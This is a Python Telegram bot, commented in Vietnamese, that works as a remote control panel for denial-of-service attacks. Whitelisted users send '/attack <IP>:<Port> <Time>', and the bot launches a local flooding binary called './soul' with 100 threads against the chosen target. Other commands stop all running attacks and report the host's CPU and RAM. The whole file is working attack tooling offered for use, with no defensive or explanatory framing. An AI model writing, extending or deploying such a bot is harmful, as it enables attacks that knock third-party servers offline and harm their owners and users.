import telebot
import subprocess
import threading
import psutil
import os
import time

# === CẤU HÌNH ===
TOKEN = "YOUR_BOT_TOKEN_HERE"  # <-- Thay TOKEN ở đây
OWNER_ID = 7088683094  # ID của bạn
THREADS = 100
USERS_FILE = "allowed_users.txt"

bot = telebot.TeleBot(TOKEN)
running_attacks = {}

# === HÀM QUẢN LÝ USER ===
def load_allowed_users():
    if not os.path.exists(USERS_FILE):
        return {OWNER_ID}
    with open(USERS_FILE, "r") as f:
        return set(int(line.strip()) for line in f if line.strip().isdigit())

def save_allowed_users():
    with open(USERS_FILE, "w") as f:
        for user_id in allowed_users:
            f.write(f"{user_id}\n")

allowed_users = load_allowed_users()

def is_authorized(user_id):
    return user_id in allowed_users

# === GIÁM SÁT TIẾN TRÌNH ===
def monitor_process(pid):
    try:
        process = psutil.Process(pid)
        process.wait()
        running_attacks.pop(pid, None)
    except psutil.NoSuchProcess:
        pass

# === LỆNH /add_user ===
@bot.message_handler(commands=['add_user'])
def add_user(message):
    if message.from_user.id != OWNER_ID:
        bot.send_message(message.chat.id, "❌ Bạn không có quyền sử dụng lệnh này.")
        return
    args = message.text.split()
    if len(args) != 2:
        bot.send_message(message.chat.id, "❌ Dùng đúng cú pháp: /add_user <user_id>")
        return
    try:
        new_user_id = int(args[1])
        allowed_users.add(new_user_id)
        save_allowed_users()
        bot.send_message(message.chat.id, f"✅ Đã thêm user `{new_user_id}` vào danh sách.", parse_mode="Markdown")
    except ValueError:
        bot.send_message(message.chat.id, "❌ user_id không hợp lệ.")

# === LỆNH /attack ===
@bot.message_handler(commands=['attack'])
def run_command(message):
    if not is_authorized(message.from_user.id):
        bot.send_message(message.chat.id, "❌ Bạn không có quyền dùng bot.")
        return

    args = message.text.split()
    if len(args) != 3 or ':' not in args[1]:
        bot.send_message(message.chat.id, "❌ Dùng đúng: /attack <IP>:<Port> <Time>")
        return

    ip_port, duration = args[1], args[2]
    ip, port = ip_port.split(':')

    try:
        process = subprocess.Popen(["./soul", ip, port, duration, str(THREADS)],
                                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        running_attacks[process.pid] = process
        threading.Thread(target=monitor_process, args=(process.pid,)).start()
        bot.send_message(message.chat.id,
                         f"🚀 **Tấn công đã bắt đầu!**\n🔹 IP: `{ip}`\n🔹 Port: `{port}`\n🔹 Thời gian: `{duration}` giây\n🔹 Luồng: `{THREADS}`",
                         parse_mode="Markdown")
    except Exception as e:
        bot.send_message(message.chat.id, f"❌ Lỗi khi chạy: {str(e)}")

# === LỆNH /stop_all ===
@bot.message_handler(commands=['stop_all'])
def stop_all_attacks(message):
    if not is_authorized(message.from_user.id):
        bot.send_message(message.chat.id, "❌ Bạn không có quyền.")
        return

    if not running_attacks:
        bot.send_message(message.chat.id, "✅ Không có tấn công nào đang chạy.")
        return

    for pid in list(running_attacks.keys()):
        try:
            parent = psutil.Process(pid)
            for child in parent.children(recursive=True):
                child.kill()
            parent.kill()
            running_attacks.pop(pid, None)
        except psutil.NoSuchProcess:
            pass

    subprocess.run("pkill -f './soul'", shell=True)
    bot.send_message(message.chat.id, "🛑 **Đã dừng tất cả cuộc tấn công!**", parse_mode="Markdown")

# === LỆNH /status ===
@bot.message_handler(commands=['status'])
def check_status(message):
    if not is_authorized(message.from_user.id):
        bot.send_message(message.chat.id, "❌ Không có quyền.")
        return

    cpu_usage = psutil.cpu_percent(interval=1)
    ram_usage = psutil.virtual_memory().percent
    uptime = time.time() - psutil.boot_time()
    uptime_str = time.strftime("%H:%M:%S", time.gmtime(uptime))

    msg = (f"📊 **Trạng thái hệ thống**\n"
           f"🔹 CPU: {cpu_usage}%\n"
           f"🔹 RAM: {ram_usage}%\n"
           f"🔹 Uptime: {uptime_str}\n"
           f"🤖 Bot: ✅ Đang chạy")
    bot.send_message(message.chat.id, msg, parse_mode="Markdown")

# === CHẠY BOT ===
def main():
    bot.polling(none_stop=True, timeout=60)

if __name__ == "__main__":
    try:
        bot.send_message(OWNER_ID, "🤖 **Bot đã khởi động!**")
        while True:
            try:
                main()
            except Exception as e:
                print(f"Lỗi polling: {e}")
                time.sleep(5)
    except Exception as e:
        print(f"Lỗi khi gửi thông báo khởi động: {e}")
